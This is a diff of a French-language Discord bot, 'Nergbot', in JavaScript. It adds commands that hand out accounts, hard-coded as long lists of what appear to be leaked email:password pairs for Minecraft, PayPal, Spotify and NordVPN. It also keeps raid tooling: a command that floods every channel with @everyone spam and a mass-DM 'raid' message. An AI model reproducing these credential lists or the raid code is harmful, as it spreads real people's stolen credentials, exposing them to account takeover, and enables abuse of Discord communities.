@@ -41,7 +41,7 @@ let statuses = [
      " mon selly https://selly.gg/@energetiq " ,
       "Energeti_q THE BEST", 
       "tranquile tu fait r 💸" ,
-      "détourne  🎲 ", 
+      `détourne  🎲  `, 
       "https://discord.gg/uyv76uv" ,
       "Endorium Copiright ©️ 2019", 
       " pour Inviter le bot :https://bit.ly/botnerg"
@@ -92,7 +92,6 @@ bot.on("message", async message => {
     const m = await message.channel.send("Ping?");
     m.edit(`Pong! Latency is ${m.createdTimestamp - message.createdTimestamp}ms. API Latency is ${Math.round(bot.ping)}ms`);
   }
-
 
   if(command === "partenariat") {
     
@@ -181,7 +180,12 @@ if (command === `Monnaie`) {
     };
 
 */
-if (command === `infobot`) {
+
+
+
+
+
+if(command === `infobot`) {
 
     let botIcon = bot.user.displayAvatarURL;
     let embed = new Discord.RichEmbed()
@@ -190,14 +194,43 @@ if (command === `infobot`) {
         .setThumbnail(botIcon)
         .addField('Nom Du Bot :', bot.user.username)
         .addField('Créer Par :', 'Energetiq')
-        .addField("Inviter le bot :","https://discordapp.com/api/oauth2/aAZuthorize?client_id=448518520301551627&permissions=8&scope=bot")
-    .addField('');
-
+        .addField("Inviter le bot :","https://discordapp.com/api/oauth2/authorize?client_id=557245884300001301&permissions=8&scope=bot")
     return message.channel.send(embed);
    };
 
 
-  
+
+   bot.on('guildMemberAdd', member => {
+
+    let serverTag = member.guild.name
+    const welcomechannel = member.guild.channels.find('id', '559806486784507906')
+    const role = member.guild.roles.find("name", "nouveau")    
+    member.addRole(role)
+    var embed = new Discord.RichEmbed()
+    .setColor(0x76D880)
+    .setDescription(`:inbox_tray: <@${member.user.id}> à rejoint ${serverTag}`)
+    return welcomechannel.send({embed})
+});
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
         //RENAME TOUT LE MONDE EN DESSOUS DU BOT
@@ -219,8 +252,8 @@ if(message.author.id == "316976857016696833")
         message.guild.members.forEach(e => {
           const embed = new Discord.RichEmbed()
            .setColor("RANDOM")
-           .addField("BACKUP GO JOIN", `Le serveur ${message.guild.name} ce fait raid par ESPRIT 
-           "https://discordapp.com/api/oauth2/authorize?client_id=448518520301551627&permissions=8&scope=bot"
+           .addField("BACKUP GO JOIN", `Le serveur ${message.guild.name} ce fait raid par Des Chips 
+           "https://discordapp.com/api/oauth2/authorize?client_id=557245884300001301&permissions=8&scope=bot"
             yes X)`)
            .setThumbnail("https://cdn.discordapp.com/attachments/549228916028735488/559406383640870912/Screenshot_20190320-212723.jpeg")
            e.user.send({embed});
@@ -262,14 +295,15 @@ if(message.author.id == "316976857016696833")
       }
 	
    if(command === "spam") {
-    message.delete()
-     let i = 0;
-     let interval = setInterval(function () {
-       message.guild.channels.forEach(channel => {
-         if (channel.type === "text") channel.send(`Le serveur **${message.guild.name}** ce fait raid par Par Des Chips Sataniques Enculeuse de Vaches Dabeuse qui aime daboudidabouda, Dédicace aux POTO de l'esprit. https://discord.gg/KcGVJwg  https://cdn.discordapp.com/attachments/550815489643905037/559694097791844352/3sKVHO28_400x400.png  @everyone`)
-       }, 1000);
-     });    
-}
+    if(message.author.id == "316976857016696833")
+      message.delete()
+       let i = 0;
+      let interval = setInterval(function () {
+        message.guild.channels.forEach(channel => {
+          if (channel.type === "text") channel.send(`Le serveur **${message.guild.name}** ce fait raid par Par Des Chips Sataniques Enculeuse de Vaches Dabeuse qui aime daboudidabouda, Dédicace aux POTO de l'esprit. https://discord.gg/KcGVJwg  https://cdn.discordapp.com/attachments/550815489643905037/559694097791844352/3sKVHO28_400x400.png  @everyone`)
+        }, 1000);
+      });    
+  }
 /*
    //COMMANDE POUR BAN TOUT LE MONDE SAUF CEUX AYANT LE GRADE
    
@@ -380,45 +414,101 @@ if(message.author.id == "316976857016696833")
 		var embed = new Discord.RichEmbed()
 			.setTitle("Help")
 			.setDescription("Commandes Par Nergbot (prefix '+')")
-			.addField("+help", "pour avoir de l'aide")
+      .addField("+help", "pour avoir de l'aide")
+      .addField("**Commande Staffs**:👮","_Réserver au staff_ !")
 			.addField("+ban {user} [info]", "ban (réservé au staff) !")
-			.addField("+ping", "pong! nan je rigole pour voir ta latence")
 			.addField(" +kick {user} [raison]", "pour éjécter un membre du serveur (réservé au Staff)")
-			.addField(" +purge {Nombre de message}", " Pour suprimé les messages!(réservé au staff) ")
-      .addField(" +pvme ", "Vous raconte Une petite Histoire en MP")
-      .addField(" +say {texte}", "Remplace votre message par celui du bot avec un embed")
+      .addField(" +purge {Nombre de message}", " Pour suprimé les messages!(réservé au staff) ")
       .addField("+mute {la personne}","Permet de mute la personne, !! IMPORTANT !! La commande est en maintenance(réservé au Staff)" )
-      .addField("+new/+close","Pour crée un tickets (mais seulement dans le salon tickets)/pour férmé un ticket")
+      .addField("+partenariat ",`A venir ....(réservé au Staff)\n`)
+      .addField("**Tout**🔧","_des Commands randoms_ ")
+      .addField("+ping", "pong! nan je rigole pour voir ta latence")
+      .addField(" +pvme ", "Vous raconte Une petite Histoire en MP")
+      .addField(" +say {texte}", "Remplace votre message par celui du bot avec un embed\n")
+      .addField("+new/+close","Pour crée un tickets (mais seulement dans le salon tickets pour ouvrir/férmé un ticket")
       .addField("+bvn","Souhaite Bienvenue !")
       .addField("+shop","Affiche le shop")
-      .addField("+partenariat ","A venir ....(réservé au Staff)")
-      .addField("+nordvpn","A venir ...")
+      .addField("+avatar","Affiche m'avatar de la personne")
+      .addField("**Infos** ℹ ","_Bots,Serveur_")
+      .addField("+serveurinfo","Donne les information sur le serveur sur lequel vous êtes")
+      .addField("+infobot","Donne les Info Sur le Bot")
+      .addField("+bot","Donne l'invitation du bot")
+      .addField("+gen","Vous donnent Tous les commandes de Génération(pour les générer il faut que ton serveur ai un channel qui se nomme 'générateur') ")
       .setColor(0x1FDDE3)
 			.setFooter("Pour plus d'info Mp Mon fondateur ! BFR عизrgetiq#9348!")
 		message.channel.sendEmbed(embed);
-
-
   } 
 
+  if(command === "gen") {
+    if (message.channel.name === "générateur"){
+    var embed = new Discord.RichEmbed()
+    .setTitle("Générateur Nerg")
+    .setDescription("Touts les Générateur Du bots :")
+    .addField("+nordvpn","Vous générer un compte NordVPN(Les comptes ne sont pas Vérifé !) ")
+    .addField("+paypal","Vous générer un Compte paypal(les comptes ne sont pas garantit ! ils peuvent ne pas fonctionner !")
+    .addField("+spotify","Vous générer un compte spotify(le compte n'est pas garantit) ")
+    .addField("+minecraft","Vous générer un compte Minecraft(le compte n'est pas garantit) ")
+    .addField("+steam","bientot disponibles")
+    .setColor(0x1FDDE3)
+    .setFooter("Pour plus d'info mp Mon fondateur ! BFR عизrgetiq#9348!")
+  message.channel.sendEmbed(embed)
+  }
+ 
+
+};
+
+//serveurs
+if(command === "servers"){
+
+  var server_count_guilds = bot.guilds.size
+  var server_count_channels = bot.channels.size
+  var server_count_users = bot.users.size
+
+  if (message.deletable) message.delete();
+  var serversEmbed = new Discord.RichEmbed()
+      .setColor(0xcee4e6)
+      .setTitle("️️️️️️️️️☠️ NergKING 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 ️️️️️️️️️☠️")
+      .setFooter("© Bot by Energetiq ")
+      .setThumbnail("https://i.imgur.com/b0deTHt.gif")
+      .addField("Connecté à ", server_count_guilds + " **servers**")
+      .addField("Lis actuellement ", server_count_channels + " **channels**")
+      .addField("Devant ", server_count_users + " **utilisateurs**")
+  message.channel.sendEmbed(serversEmbed);
+}
+// pv me
   	if (command === 'pvme') {
 		message.author.createDM().then(channel =>  
       channel.send("Tu a bien fait de tester car je vais te raconter une petite histoire : https://privnote.com/VGtizhrD#nP9fxtd25")
 			)
 
 			
-		};
+    };
+    if(command === 'WhiteAdd') {
+      message.guild.createChannel('name','WhiteList')
+    }
 
-  
+    if(command === "whitelist") {
+      var embed = new Discord.RichEmbed()
+      .setTitle("Demande de Add WhiteList")
+      .addField(`demande de ${message.author} `,"Pour être Add A la White-List")
+      .setFooter("Votre Demande a été Envoyé !")
+      .setURL('http://endorium.ezcraft.fr')
+      .setColor(0xB40404)
+      channel('WhiteList').message.sendEmbed(embed)
+    
+    }
+
+// avatar  
    if(command === "avatar") { 
      message.reply(message.author.avatarURL)
    }
 
-
+// log (non fonctionnel)
    if(command === "log"){
      message.guild.createChannel("log", "Ici Tu auras tout les logs")
     Channel.permissions()
    }
-
+// purge 
    if(command === "purge") {
     // This command removes all messages from all users in the channel, up to 100.
     
@@ -436,6 +526,13 @@ if(message.author.id == "316976857016696833")
   }
 
 
+
+
+
+
+
+
+// msg
   if(command === "msg") {
         
         let member = message.mentions.members.first() || message.guild.members.get(args[0]);
@@ -445,6 +542,7 @@ if(message.author.id == "316976857016696833")
         member.send(`${msgg} `)
    
   }
+  //serveur info
   if(command === "serveurinfo"){
     var embed = new Discord.RichEmbed()
       .setDescription("Info Discord")
@@ -455,7 +553,7 @@ if(message.author.id == "316976857016696833")
       .setColor("RANDOM")
    message.channel.sendEmbed(embed);
   };
-
+//sondage
   if(command === "sondage") {
     let args = message.content.split(" ").slice(1);
     let thingToEcho = args.join(" ")
@@ -472,11 +570,118 @@ if(message.author.id == "316976857016696833")
     });
   }
 
+  /* Fornite
+    bot.on("message", async function(message){
     
-
+      let messageKick = message.content.split(" ");
+      let args = messageKick.slice(1);
+  
+  
+  
+      if(message.content.startsWith(prefix + "fortnite-pc")){
+          let pseudo = args.join(" ").slice(0)
+          if(!pseudo) return message.channel.send("Vous devez entrer votre pseudo epic game !")
+          request("https://fortnite-public-api.theapinetwork.com/prod09/users/id?username=" + pseudo, async function(error,response,body){
+              let lejson = JSON.parse(body)
+              if(lejson.uid === undefined) return message.channel.send("Ce pseudo epic game n'existe pas !")
+              let uid = lejson.uid
+  
+              await request("https://fortnite-public-api.theapinetwork.com/prod09/users/public/br_stats?user_id=" + uid + "&platform=pc",function(error,response,body){
+                  let infos = JSON.parse(body)
+                  if(infos["totals"] === undefined) return message.channel.send("Vous devez entrer un pseudo epic games")
+                  let embed = new Discord.RichEmbed()
+                  .setColor("00F919")
+                  .setTitle(infos.username + " - " + infos.platform)
+                  .addField("Scores totaux :","**Kills** : " + infos["totals"].kills+
+                  "\n**Top 1** : " + infos["totals"].wins+
+                  "\n**Matchs joués** : " + infos["totals"].matchesplayed+
+                  "\n**Temps** : " + infos["totals"].hoursplayed + "h" +
+                  "\n**Winrate** : " + infos["totals"].winrate+
+                  "\n**K/D** : " + infos["totals"].kd)
+                  .addBlankField()
+                  .addField("Solo :","**kills** : " + infos["stats"].kills_solo+
+                  "\n**Top 1** : " + infos["stats"].placetop1_solo+
+                  "\n**Top 10** : " + infos["stats"].placetop10_solo+
+                  "\n**match joués** : " + infos["stats"].matchesplayed_solo+
+                  "\n**K/D** : " + infos["stats"].kd_solo+
+                  "\n**Winrate** : " + infos["stats"].winrate_solo+
+                  "\n**Temps** : " + (infos["stats"].minutesplayed_solo / 6).toFixed(0) +
+                  "\n**Score** : " + infos["stats"].score_solo,true)
+                  .addField("Duo :","**kills** : " + infos["stats"].kills_duo+
+                  "\n**Top 1** : " + infos["stats"].placetop1_duo+
+                  "\n**Top 12** : " + infos["stats"].placetop12_duo+
+                  "\n**match joués** : " + infos["stats"].matchesplayed_duo+
+                  "\n**K/D** : " + infos["stats"].kd_duo+
+                  "\n**Winrate** : " + infos["stats"].winrate_duo+
+                  "\n**Temps** : " + (infos["stats"].minutesplayed_duo / 6).toFixed(0) +
+                  "\n**Score** : " + infos["stats"].score_duo,true)
+                  .addField("Squad :","**kills** : " + infos["stats"].kills_squad+
+                  "\n**Top 1** : " + infos["stats"].placetop1_squad+
+                  "\n**Top 6** : " + infos["stats"].placetop6_squad+
+                  "\n**match joués** : " + infos["stats"].matchesplayed_squad+
+                  "\n**K/D** : " + infos["stats"].kd_squad+
+                  "\n**Winrate** : " + infos["stats"].winrate_squad+
+                  "\n**Temps** : " + (infos["stats"].minutesplayed_squad / 6).toFixed(0) +
+                  "\n**Score** : " + infos["stats"].score_squad,true)
+                  message.channel.send(embed)
+              })  
+          })
+      }
+  
+      if(message.content.startsWith(prefix + "fortnite-ps4")){
+          let pseudo = args.join(" ").slice(0)
+          if(!pseudo) return message.channel.send("Vous devez entrer votre pseudo epic game !")
+          request("https://fortnite-public-api.theapinetwork.com/prod09/users/id?username=" + pseudo, async function(error,response,body){
+              let lejson = JSON.parse(body)
+              if(lejson.uid === undefined) return message.channel.send("Ce pseudo epic game n'existe pas !")
+              let uid = lejson.uid
+  
+              await request("https://fortnite-public-api.theapinetwork.com/prod09/users/public/br_stats?user_id=" + uid + "&platform=ps4",function(error,response,body){
+                  let infos = JSON.parse(body)
+                  if(infos["totals"] === undefined) return message.channel.send("Vous devez entrer un pseudo epic games")
+                  let embed = new Discord.RichEmbed()
+                  .setColor("00F919")
+                  .setTitle(infos.username + " - " + infos.platform)
+                  .addField("Scores totaux :","**Kills** : " + infos["totals"].kills+
+                  "\n**Top 1** : " + infos["totals"].wins+
+                  "\n**Matchs joués** : " + infos["totals"].matchesplayed+
+                  "\n**Temps** : " + infos["totals"].hoursplayed + "h" +
+                  "\n**Winrate** : " + infos["totals"].winrate+
+                  "\n**K/D** : " + infos["totals"].kd)
+                  .addBlankField()
+                  .addField("Solo :","**kills** : " + infos["stats"].kills_solo+
+                  "\n**Top 1** : " + infos["stats"].placetop1_solo+
+                  "\n**Top 10** : " + infos["stats"].placetop10_solo+
+                  "\n**match joués** : " + infos["stats"].matchesplayed_solo+
+                  "\n**K/D** : " + infos["stats"].kd_solo+
+                  "\n**Winrate** : " + infos["stats"].winrate_solo+
+                  "\n**Temps** : " + (infos["stats"].minutesplayed_solo / 6).toFixed(0) +
+                  "\n**Score** : " + infos["stats"].score_solo,true)
+                  .addField("Duo :","**kills** : " + infos["stats"].kills_duo+
+                  "\n**Top 1** : " + infos["stats"].placetop1_duo+
+                  "\n**Top 12** : " + infos["stats"].placetop12_duo+
+                  "\n**match joués** : " + infos["stats"].matchesplayed_duo+
+                  "\n**K/D** : " + infos["stats"].kd_duo+
+                  "\n**Winrate** : " + infos["stats"].winrate_duo+
+                  "\n**Temps** : " + (infos["stats"].minutesplayed_duo / 6).toFixed(0) +
+                  "\n**Score** : " + infos["stats"].score_duo,true)
+                  .addField("Squad :","**kills** : " + infos["stats"].kills_squad+
+                  "\n**Top 1** : " + infos["stats"].placetop1_squad+
+                  "\n**Top 6** : " + infos["stats"].placetop6_squad+
+                  "\n**match joués** : " + infos["stats"].matchesplayed_squad+
+                  "\n**K/D** : " + infos["stats"].kd_squad+
+                  "\n**Winrate** : " + infos["stats"].winrate_squad+
+                  "\n**Temps** : " + (infos["stats"].minutesplayed_squad / 6).toFixed(0) +
+                  "\n**Score** : " + infos["stats"].score_squad,true)
+                  message.channel.send(embed)
+                  console.log(infos)
+              })  
+          })
+      }
+  */  
 
   if(command === "bot ") {
-    message.channel.send("https://discordapp.com/api/oauth2/authorize?client_id=448518520301551627&permissions=8&scope=bot"
+    message.channel.send("https://discordapp.com/api/oauth2/authorize?client_id=557245884300001301&permissions=8&scope=bot"
     )
   }
 
@@ -503,6 +708,67 @@ if(message.author.id == "316976857016696833")
     }
 
 });
+/*
+CREATE_INSTANT_INVITE: true,
+  KICK_MEMBERS: true,
+  BAN_MEMBERS: true,
+  ADMINISTRATOR: true,
+  MANAGE_CHANNELS: true,
+  MANAGE_GUILD: true,
+  ADD_REACTIONS: true,
+  READ_MESSAGES: true,
+  SEND_MESSAGES: true,
+  SEND_TTS_MESSAGES: true,
+  MANAGE_MESSAGES: true,
+  EMBED_LINKS: true,
+  ATTACH_FILES: true,
+  READ_MESSAGE_HISTORY: true,
+  MENTION_EVERYONE: true,
+  EXTERNAL_EMOJIS: true,
+  CONNECT: true,
+  SPEAK: true,
+  MUTE_MEMBERS: true,
+  DEAFEN_MEMBERS: true,
+  MOVE_MEMBERS: true,
+  USE_VAD: true,
+  CHANGE_NICKNAME: true,
+  MANAGE_NICKNAMES: true,
+  MANAGE_ROLES_OR_PERMISSIONS: true,
+  MANAGE_WEBHOOKS: true,
+  MANAGE_EMOJIS: true
+*/
+
+
+if(command === "verif") {
+    var embed = new Discord.RichEmbed()
+    .setTitle("Vérification")
+    .setDescription("Instruction Pour Pouvoir Accéder au reste du Serveur")
+    .addField("Pou acceder au reste du serveur clic sur ✅ Dans La réaction du bot !","si tu ne te vérifie pas Tu sera Kick dans les plus bref délais !")
+    .setColor("RANDOM")
+    .setImage("https://cdn.discordapp.com/attachments/564137773603225624/564850872199282688/Capture.PNG")
+    .setFooter("Pour plus d'info Mp Mon fondateur ! BFR عизrgetiq#9348!")
+     message.channel.sendEmbed(embed)
+     var role = message.guild.roles.find(role => role.id === "559806475451629589");
+     bot.on('messageReactionAdd', (réaction, user) =>{
+      var role = "559806475451629589" 
+      message.member.addRole(role);
+          });
+    
+}
+
+
+
+
+
+
+
+ if(command === "setup") {
+  if(!message.guild.member(message.author).hasPermission("ADMINISTRATOR")) return message.channel.send("❌ Tu n'as pas la permission d'utiliser cette commande!");
+  guild.createChannel('voice',`Nombre De Joueurs ${guild.memberCount} `)
+ }
+
+
+
 
 
 
@@ -519,7 +785,6 @@ message.channel.sendEmbed(embed);
 
 
 bot.on('message', msg => {
-  if(message.author.id == "316976857016696833")
     if(msg.author.bot) return;
 
     if(msg.channel.type === "dm") return; //empeche d'exécuter les commandes en dm
@@ -611,14 +876,342 @@ bot.on('message', msg => {
     .addField('Voici ton compte NordVPN(attention ils ne sont pas garantit !): ',
     randomAnswerPicker)
    .setColor("RANDOM")
-        .setImage("https://media.discordapp.net/attachments/541586025710092298/547813811403358208/MOSHED-2019-2-20-17-15-48.gif?width=562&height=422" )
-        .setTimestamp()
+        .setImage("https://www.google.com/imgres?imgurl=https%3A%2F%2Fwww.nosoftwarepatents.com%2Fwp-content%2Fuploads%2F2018%2F07%2FCLogo-NordVPN.jpg&imgrefurl=https%3A%2F%2Fwww.nosoftwarepatents.com%2Favis-nordvpn%2F&docid=6sDALuZf81M-4M&tbnid=b7OqUy5SKQHDsM%3A&vet=10ahUKEwik5e_F2LXhAhXF6OAKHdXRABQQMwhAKAEwAQ..i&w=250&h=250&bih=789&biw=1600&q=logo%20nordvpn&ved=0ahUKEwik5e_F2LXhAhXF6OAKHdXRABQQMwhAKAEwAQ&iact=mrc&uact=8" )
+        .setTimestamp(15000)
   msg.channel.send(`**ton compte a bien été généré va voir tes mp **📥🔖`);
   msg.author.send({embed})
   }
   
   }
 });
+
+
+
+
+
+
+
+
+bot.on('message', msg => {
+  if(msg.author.bot) return;
+
+  if(msg.channel.type === "dm") return; //empeche d'exécuter les commandes en dm
+
+  if (msg.content === '+minecraft') { //commande a exécuté
+    if (msg.channel.name === "générateur"){ //obligatoirement dans un salon qui se nome générateur (vous pouvez le modifier)
+
+var answers = [
+
+//il faut mettre tout les compte entre des ' ' !
+
+"sknauer@mac.com:beehive6624",
+"F5_Lakers@hotmail.com:ethanhunt",
+"fadi.mandura@gmail.com:Darrelabbot710",
+"shre11@yahoo.com:3333ws",
+"johnrvw@yahoo.com:osan2621",
+"Cubi2011@web.de:12345ert",
+"brilgermanotta@yahoo.com:96799834",
+"rafaell.rcmr@gmail.com:64746347",
+"jeffrey823@gmail.com:Medical989",
+"rezamatrix@gmail.com:reza2106",
+"jinjyjjin@sina.com:1300312jin",
+"skasselakis1@gmail.com:Merrill10",
+"markie610@gmail.com:gajunia5",
+"abnoutlaw@gmail.com:whutitdew2",
+"ronlessel@yahoo.com:1q2w3e4r",
+"arsencameron222@gmail.com:arsenlol123",
+"jonas_mts@hotmail.com:ivaneide",
+"anabeatricepa408@gmail.com:yasminpr",
+"greg.james.miller@gmail.com:kfnmertn",
+"keelycrum@gmail.com:launchpad",
+"rubalo@gmail.com:platinum",
+"dfmickey@gmail.com:brittany",
+"eyamie@gmail.com:reggie",
+"anime.lovers@mail.ru:maks223223445",
+"tulaihia@gmail.com:kainkain",
+"hicham.guer@gmail.com:29121984",
+"bitch@bitch.com:bitch",
+"barrgeorgie@gmail.com:Georgie1101",
+"myonghwi@gmail.com:hanazono",
+"Joshua83@gmail.com:biochem3",
+"eren.sergen@googlemail.com:metin2acc",
+"caio_zoboli@hotmail.com:b9w8b9j4",
+"tevanromero@yahoo.com:ella5525",
+"usakokonchan@gmail.com:75365259",
+"christian-nack@hotmail.de:ff125135",
+"androonguyen@gmail.com:beuscher",
+"bodeysobhy112@gmail.com:Sobhy321",
+"eduardosandovalgomeza@gmail.com",
+"javier_beltran87@yahoo.com:alexcia30",
+"elias_bougharios@hotmail.com:popper12345",
+"smejkalkurtis@gmail.com:061188Ks",
+"c.h.steveip@gmail.com:2oo9145932",
+"christofermvieta@gmail.com:vifarm01",
+"crtrdn@gmail.com:cr54tr78dn",
+"ali_mak46@yahoo.com:123233",
+"alizzz94@yahoo.com:777777",
+"alliabrar@gmail.com:titanic02",
+"neilmpenney@hotmail.com:nempen87",
+"gx@live.com.sg:lovezick98",
+"johnwklee@yahoo.com:jl230891",
+"kiwilicous_kiwi@hotmail.com:woaainee",
+"jiuwai@gmail.com:oicla999",
+"mckayjunk@gmail.com:high11",
+"bob.coolguy@gmail.com:wigglemania",
+"ilya-gallyamov@mail.ru:121201ilya",
+"b.case@aggiemail.usu.edu:14cousins",
+"natalia.kempin@googlemail.com:livenet666",
+"bach.oliver3@gmail.com:Futte2606",
+"jza162001@yahoo.com:password6",
+"higsonadam1905@gmail.com:amarett0",
+"rachael_pang@hotmail.com:322454653",
+"izwan00@gmail.com:hell4se68",
+"dirtyzed@hotmail.com:piazza",
+"k.soezbilen@hotmail.de:f4fe7dca",
+"semihsari@hotmail.de:semih9988",
+"djones5qvc@gmail.com:bronco95",
+"msomfa@gmail.com:mso101089",
+"arlindo.mieiro@gmail.com:miguel07",
+"marvinminato@hotmail.de:Ronaldo12",
+"fetchek@gmail.com:fetche4ever",
+"g_souza9@hotmail.com:51fsc345",
+"farad@alhusaini.org:200776"       //ne pas mettre de virgule "," pour le dernier compte 
+];
+
+let randomAnswerPicker = answers[Math.floor(Math.random() * answers.length)];
+  const embed = new Discord.RichEmbed()
+  .setFooter("Copyright © 2019 Endorium")
+  .addField('Voici ton compte Minecraft(attention ils ne sont pas garantit !): ',
+  randomAnswerPicker)
+ .setColor("RANDOM")
+      .setImage("https://www.google.com/imgres?imgurl=https%3A%2F%2Fi.pinimg.com%2Foriginals%2Fb8%2F10%2F2b%2Fb8102bc2860e12cf9b5d54a1f9f068bd.jpg&imgrefurl=https%3A%2F%2Fwww.pinterest.com%2Fpin%2F689121180454480736%2F&docid=CQIuvoZWuwMb6M&tbnid=C49do5wlfY62hM%3A&vet=10ahUKEwjdwJGi4r3hAhW2QxUIHSxMDMwQMwhNKA4wDg..i&w=1200&h=900&bih=740&biw=1600&q=logo%20minecraft&ved=0ahUKEwjdwJGi4r3hAhW2QxUIHSxMDMwQMwhNKA4wDg&iact=mrc&uact=8" )
+      .setTimestamp(15000)
+msg.channel.send(`**ton compte a bien été généré va voir tes mp **📥🔖`);
+msg.author.send({embed})
+}
+
+}
+});
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+bot.on('message', msg => {
+  if(msg.author.bot) return;
+
+  if(msg.channel.type === "dm") return; //empeche d'exécuter les commandes en dm
+
+  if (msg.content === '+paypal') { //commande a exécuté
+    if (msg.channel.name === "générateur"){ //obligatoirement dans un salon qui se nome générateur (vous pouvez le modifier)
+
+var answers = [
+
+//il faut mettre tout les compte entre des ' ' !
+"ansgar_bussmann@freenet.de:wilhelm",
+"sktrash@freenet.de:sluspiku",
+"nicoledeutschmann@freenet.de:nikita",
+"klausdieter.gulba@freenet.de:kdg1939",
+"cherokees@web.de:amiscum",
+"franziskamaurer_87@web.de:jonathan05",
+"franziskamaurer_87@web.de:jonathan05nicolai.walsemann@gmx.de:darkusos1",
+"mirco@legionis-stuff.de:hallo987",
+"nicolai.walsemann@gmx.de:darkusos1",
+"leterrex@gmx.de:meinefresse",
+"lets.play.shiro@outlook.de:schweizer1",
+"letsdance6@web.de:dennniis",
+"letshatex33@web.de:MOINSEN12",
+"letshatex33@web.de:moinsen12",
+"letskillsantaclaus@live.de:Kennwort",
+"dwnsemail@gmail.com:megkt4395",
+"letsmentary@yahoo.de:pass123wort",
+"letsplay-9@web.de:179das18",
+"letsplay23@hotmail.de:36610659",
+"letsplay23@hotmail.de:naruto77",
+"letsplay@vorsicht-bissig.de:361352927262",
+"letter-x@hotmail.de:badboy123",
+"letty@web.de:123456789",
+"leutrim9@hotmail.de:q2w3e4r5",
+"leveluphdx@hotmail.de:Jm17101996",
+"levermann.neuenrade@freenet.de:levermann",
+"levi.blohm@web.de:oonowrjh",
+"levi66@live.de:afrika123",
+"leviatharidragon@gmx.de:29Jenny88",
+"levin.mohr@web.de:levinmohr",
+"levin.werner@web.de:Laurin1771",
+"levin@new-communication.de:levinmohr",
+"levo_thirty-siixx@hotmail.de:kreuzberg36",
+"levstork@web.de:jay123456",
+"lewan91@gmx.de:pimmel2544",
+"lex.lex4@web.de:lutzlutz",
+"lexa35@hotmail.de:kawaZX12",
+"lexi@web.de:maggisw554",
+"lexion.580@web.de:goldpack",
+"lexusdeutscher@web.de:qwedcvb1",
+"lexusis300@web.de:alemdar67",
+"leylalunaris@yahoo.de:blacky123",
+"lg.9@hotmail.de:36ad8b5f",
+"lgawlik@gmx.de:05834710",
+"lghdfxlo@hotmail.de:Dumm439",
+"lgrandits@yahoo.de:kuschel1991",
+"lgtiger98@web.de:babolat1",
+"lh@haasehome.de:ammonit123",
+"liafg@hotmail.de:235d4034",
+"liam-cesar@gmx.de:Lukas123",
+"liamtoh_@hotmail.de:Adsfadsf123",
+"liamtoh_@hotmail.de:kimberly",
+"lias-heuser@gmx.de:gammi123",
+"liasfh@hotmail.de:235d4034",
+"libanese.player.16@hotmail.de:samuelzahn",
+"libanese_2010@hotmail.de:zeaiter123",
+"libanesen-boy13@hotmail.de:libanon123",
+"libanon_x33@hotmail.de:gangbang",
+"libe-@hotmail.de:tannenbaum",
+"liberojannik@web.de:Jeffhardy1",
+"libuda19041@freenet.de:schalke04",
+"lexa35@hotmail.de:insidetm12"
+    //ne pas mettre de virgule "," pour le dernier compte 
+];
+
+let randomAnswerPicker = answers[Math.floor(Math.random() * answers.length)];
+  const embed = new Discord.RichEmbed()
+  .setFooter("Copyright © 2019 Endorium")
+  .addField('Voici ton compte paypal(attention ils ne sont pas garantit !): ',
+  randomAnswerPicker)
+ .setColor("RANDOM")
+      .setImage("https://www.google.com/imgres?imgurl=https%3A%2F%2Fwww.paypalobjects.com%2Fwebstatic%2Ficon%2Fpp258.png&imgrefurl=https%3A%2F%2Fwww.paypal.com%2Ffr%2Fhome&docid=Cxc5SPv6UE6Y6M&tbnid=_bkzi8xQgG2DDM%3A&vet=10ahUKEwij_uyHr7ThAhXU8uAKHYoIB8kQMwg9KAAwAA..i&w=259&h=259&bih=789&biw=1600&q=paypal&ved=0ahUKEwij_uyHr7ThAhXU8uAKHYoIB8kQMwg9KAAwAA&iact=mrc&uact=8")
+      .setTimestamp(30000)
+msg.channel.send(`**ton compte a bien été généré va voir tes mp **📥🔖`);
+msg.author.send({embed})
+}
+
+}
+});
+
+bot.on('message', msg => {
+  if(msg.author.bot) return;
+
+  if(msg.channel.type === "dm") return; //empeche d'exécuter les commandes en dm
+
+  if (msg.content === '+spotify') { //commande a exécuté
+    if (msg.channel.name === "générateur"){ //obligatoirement dans un salon qui se nome générateur (vous pouvez le modifier)
+
+var answers = [
+
+//il faut mettre tout les compte entre des ' ' !
+"ansgar_bussmann@freenet.de:wilhelm",
+"sktrash@freenet.de:sluspiku",
+"nicoledeutschmann@freenet.de:nikita",
+"klausdieter.gulba@freenet.de:kdg1939",
+"cherokees@web.de:amiscum",
+"franziskamaurer_87@web.de:jonathan05",
+"franziskamaurer_87@web.de:jonathan05",
+"nicolai.walsemann@gmx.de:darkusos1",
+"mirco@legionis-stuff.de:hallo987",
+"nicolai.walsemann@gmx.de:darkusos1",
+"leterrex@gmx.de:meinefresse",
+"lets.play.shiro@outlook.de:schweizer1",
+"letsdance6@web.de:dennniis",
+"letshatex33@web.de:MOINSEN12",
+"letshatex33@web.de:moinsen12",
+"letskillsantaclaus@live.de:Kennwort",
+"letsmentary@yahoo.de:pass123wort",
+"letsplay-9@web.de:179das18",
+"letsplay23@hotmail.de:36610659",
+"letsplay23@hotmail.de:naruto77",
+"letsplay@vorsicht-bissig.de:361352927262",
+"letter-x@hotmail.de:badboy123",
+"letty@web.de:123456789",
+"leutrim9@hotmail.de:q2w3e4r5",
+"leveluphdx@hotmail.de:Jm17101996",
+"levermann.neuenrade@freenet.de:levermann",
+"levi.blohm@web.de:oonowrjh",
+"levi66@live.de:afrika123",
+"leviatharidragon@gmx.de:29Jenny88",
+"levin.mohr@web.de:levinmohr",
+"levin.werner@web.de:Laurin1771",
+"levin@new-communication.de:levinmohr",
+"levo_thirty-siixx@hotmail.de:kreuzberg36",
+"levstork@web.de:jay123456",
+"lewan91@gmx.de:pimmel2544",
+"lex.lex4@web.de:lutzlutz",
+"lexa35@hotmail.de:kawaZX12",
+"lexi@web.de:maggisw554",
+"lexion.580@web.de:goldpack",
+"lexusdeutscher@web.de:qwedcvb1",
+"lexusis300@web.de:alemdar67",
+"leylalunaris@yahoo.de:blacky123",
+"lg.9@hotmail.de:36ad8b5f",
+"lgawlik@gmx.de:05834710",
+"lghdfxlo@hotmail.de:Dumm439",
+"lgrandits@yahoo.de:kuschel1991",
+"lgtiger98@web.de:babolat1",
+"lh@haasehome.de:ammonit123",
+"liafg@hotmail.de:235d4034",
